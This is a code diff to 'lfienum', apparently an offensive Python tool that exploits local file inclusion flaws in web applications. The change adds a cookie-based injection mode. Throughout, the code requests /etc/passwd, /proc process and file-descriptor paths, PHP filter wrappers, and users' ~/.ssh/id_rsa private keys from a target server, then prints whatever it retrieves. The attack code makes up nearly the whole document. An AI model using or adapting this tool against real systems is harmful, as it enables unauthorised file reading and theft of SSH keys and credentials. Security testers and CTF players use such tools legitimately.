@@ -29,7 +29,8 @@ def Help():
 	print ("    -x1                        Use XCF_A function print all text between tags (default)")
 	print ("    -x2                        Use XCF_B function print all text that isn't between any tag")
 	print ("    -x3                        Use XCF_C function print content between specific tag")
-	print ("    -x4                        Use XCF_D function delete all content inside <html> and </html> tags")
+	print ("    -x4                        Use XCF_D function delete all content inside <html> and </html> tags\n")
+	print ("    --cookie                   Cookie mode (LFI through cookies)")
 
 def AdHelp():
 
@@ -71,6 +72,11 @@ def AdHelp():
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" -k -x2')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url -vvv\n')
+	print ('[COOKIE MODE]\n')
+	print ('    python3 lfienum http://127.0.0.1/index.php --cookie session')
+	print ('    python3 lfienum http://127.0.0.1/index.php --cookie PHPSESSID -k -x4')
+	print ('    python3 lfienum http://127.0.0.1/index.php --cookie session --pids 847 --only-url')
+	print ('    python3 lfienum http://127.0.0.1/index.php --cookie session --wrapper index.php --only-url -vvv\n')
 
 if '-h' in sys.argv or '--help' in sys.argv:
 
@@ -1282,15 +1288,28 @@ def LinEnum():
 	for possible_lfi_file in linux_lfi_wordlist:
 
 		global resp
-		resp = requests.get(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
+
+		if ck == True:
+
+			resp = requests.get(url, cookies={cookie:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
+		
+		else:
+		
+			resp = requests.get(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
 
 		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
 
 			XCF()
 			
 			if len(clean_content) > 0:
-
-				print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
+			
+				if ck == True:
+				
+					print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file + ColEnd)
+			
+				else:
+				
+					print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
 
 				if package_status == True:
 	
@@ -1305,15 +1324,27 @@ def WinEnum():
 	for possible_lfi_file in windows_lfi_wordlist:
 
 		global resp
-		resp = requests.get(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
+		if ck == True:
+
+			resp = requests.get(url, cookies={cookie:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)
+		
+		else:
+		
+			resp = requests.get(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
 
 		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
 
 			XCF()
 
 			if len(clean_content) > 0:
-
-				print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
+			
+				if ck == True:
+				
+					print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file + ColEnd)
+			
+				else:
+				
+					print (ColGreenMark + "> " + url + possible_lfi_file + ColEnd)
 				
 				if package_status == True:
 	
@@ -1330,15 +1361,28 @@ def Wordlist():
 		for possible_lfi_file in custom_wordlist:
 
 			global resp
-			resp = requests.get(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
+
+			if ck == True:
+
+				resp = requests.get(url, cookies={cookie:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)
+			
+			else:
+
+				resp = requests.get(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
 
 			if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
 
 				XCF()
 
 				if len(clean_content) > 0:
-
-					print (ColGreenMark + "> " + url + possible_lfi_file.strip() + ColEnd)
+				
+					if ck == True:
+					
+						print (ColGreenMark + "> " + url + ' ' + cookie + '=' + possible_lfi_file.strip() + ColEnd)
+				
+					else:
+					
+						print (ColGreenMark + "> " + url + possible_lfi_file.strip() + ColEnd)
 					
 					if package_status == True:
 	
@@ -1362,7 +1406,14 @@ def PIDS():
 	for pid in range(pid_count+1):
 
 		global resp
-		resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
+	
+		if ck == True:
+		
+			resp = requests.get(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)
+		
+		else:
+		
+			resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
 
 		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
 
@@ -1376,7 +1427,13 @@ def PIDS():
 
 				if only_url == True:
 				
-					print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
+					if ck == True:
+					
+						print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)				
+				
+					else:
+					
+						print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
 
 				if package_status == True:
 	
@@ -1386,7 +1443,14 @@ def PID():
 
 	pid = int(pid_x)
 	global resp
-	resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
+	
+	if ck == True:
+		
+		resp = requests.get(url, cookies={cookie:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)	
+	
+	else:
+		
+		resp = requests.get(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
 
 	if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
 
@@ -1399,8 +1463,14 @@ def PID():
 				print (ColGreenMark + "PID " + str(pid) + ":" + ColEnd + " " + clean_content.strip())
 
 			if only_url == True:
+			
+				if ck == True:
 				
-				print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
+					print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/' + str(pid) + '/cmdline' + ColEnd)
+					
+				
+				else:
+					print (ColGreenMark + "> " + url + '/proc/' + str(pid) + '/cmdline' + ColEnd)
 
 			if package_status == True:
 	
@@ -1420,15 +1490,27 @@ def FD():
 	for fd in range(fd_count+1):
 
 		global resp
-		resp = requests.get(url + '/proc/self/fd/' + str(fd), verify=True, headers=headers, allow_redirects=False)
+		
+		if ck == True:
+		
+			resp = requests.get(url, cookies={cookie:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)
+		
+		else:
+			resp = requests.get(url + '/proc/self/fd/' + str(fd), verify=True, headers=headers, allow_redirects=False)
 
 		if resp.status_code == 200 or resp.status_code == 301 or resp.status_code == 302:
 
 			XCF()
 
 			if len(clean_content) > 0:
-
-				print (ColGreenMark + "> " + url + '/proc/self/fd/' + str(fd) + ColEnd)
+			
+				if ck == True:
+				
+					print (ColGreenMark + "> " + url + ' ' + cookie + '=/proc/self/fd/' + str(fd) + ColEnd)
+						
+				else:
+				
+					print (ColGreenMark + "> " + url + '/proc/self/fd/' + str(fd) + ColEnd)
 				
 				if package_status == True:
 	
@@ -1441,13 +1523,26 @@ def FD():
 def Wrapper():
 
 	global resp
-	resp = requests.get(url + 'php://filter/convert.base64-encode/resource=' + wrap_x, verify=True, headers=headers, allow_redirects=False)
+	
+	if ck == True:
+	
+		resp = requests.get(url, cookies={cookie:'php://filter/convert.base64-encode/resource=' + wrap_x}, verify=True, headers=headers, allow_redirects=False)	
+	
+	else:
+		resp = requests.get(url + 'php://filter/convert.base64-encode/resource=' + wrap_x, verify=True, headers=headers, allow_redirects=False)
 	
 	XCF()
 	
 	if len(clean_content) > 0:
 	
-		print(ColGreenMark + "> " + url + 'php://filter/convert.base64-encode/resource=' + sys.argv[3] + ColEnd)
+	
+		if ck == True:
+		
+			print(ColGreenMark + "> " + url + ' ' + cookie + '=php://filter/convert.base64-encode/resource=' + wrap_x + ColEnd)
+	
+		else:
+		
+			print(ColGreenMark + "> " + url + 'php://filter/convert.base64-encode/resource=' + wrap_x + ColEnd)
 		
 		if package_status == True:
 		
@@ -1469,14 +1564,29 @@ def Wrapper():
 def IdRSA():
 
 	global resp
-	resp = requests.get(url + '/etc/passwd')
+	
+	if ck == True:
+	
+		resp = requests.get(url, cookies={cookie:'/etc/passwd'})
+	
+	else:
+	
+		
+		resp = requests.get(url + '/etc/passwd')
+	
 	cleanresponse = resp.text
 
 	for fetch_users in cleanresponse.split('\n'):
 
 		if ':/home/' in fetch_users:
-
-			fetch_id_rsa = requests.get(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa', verify=True, headers=headers, allow_redirects=False)
+		
+			if ck == True:
+			
+				fetch_id_rsa = requests.get(url, cookies={cookie:'/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa'}, verify=True, headers=headers, allow_redirects=False)
+			
+			else:
+			
+				fetch_id_rsa = requests.get(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa', verify=True, headers=headers, allow_redirects=False)
 			resp = fetch_id_rsa
 
 			if fetch_id_rsa.status_code == 200 or fetch_id_rsa.status_code.status_code == 301 or fetch_id_rsa.status_code.status_code == 302:
@@ -1485,10 +1595,15 @@ def IdRSA():
 
 				if len(clean_content) > 0:
 
-					print (ColGreenMark + '> ' + url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)
+					if ck == True:
+					
+						print (ColGreenMark + '> ' + url + ' ' + cookie + '=/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)
+					else:
+					
+						print (ColGreenMark + '> ' + url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa' + ColEnd)
 					
 					if only_url == False:
-					
+						
 						print (ColYellowMark + '> ' + fetch_users.split(":")[0].strip() + ' id_rsa private key' + ColEnd)
 					
 					if package_status == True:
@@ -1540,6 +1655,12 @@ def Main():
 		if '-k' == arg or '--key' == arg:	
 			
 			keyp = True
+			
+		if '--cookie' == arg:
+
+			global ck
+			ck = True
+			cookiep = int(parser.index(arg)+1)
 	
 	global wordlist
 	global fd_x
@@ -1547,6 +1668,21 @@ def Main():
 	global pid_x
 	global wrap_x
 	global key_x
+	global cookie
+
+	try:
+		cookie = parser[cookiep]
+		
+	except IndexError:
+	
+		print ("cookie usage example:")
+		print ("python3 lfienum http://ghost.server/index.php --cookie 'session'")
+		sys.exit(1)
+		
+	except UnboundLocalError:
+	
+		ck = False
+		pass
 	
 	try:
 		if 'http' in sys.argv[1] and not '--pids' in sys.argv and not '--pid' in sys.argv and not '--fd' in sys.argv and not '--wrapper' in sys.argv and not '-w' in sys.argv and not '--wordlist' in sys.argv and not '-k' in sys.argv and not '--key' in sys.argv:
@@ -1557,7 +1693,8 @@ def Main():
 	except:
 	
 		sys.exit(1)
-	
+
+
 	try:
 		if keyp == True:
 	
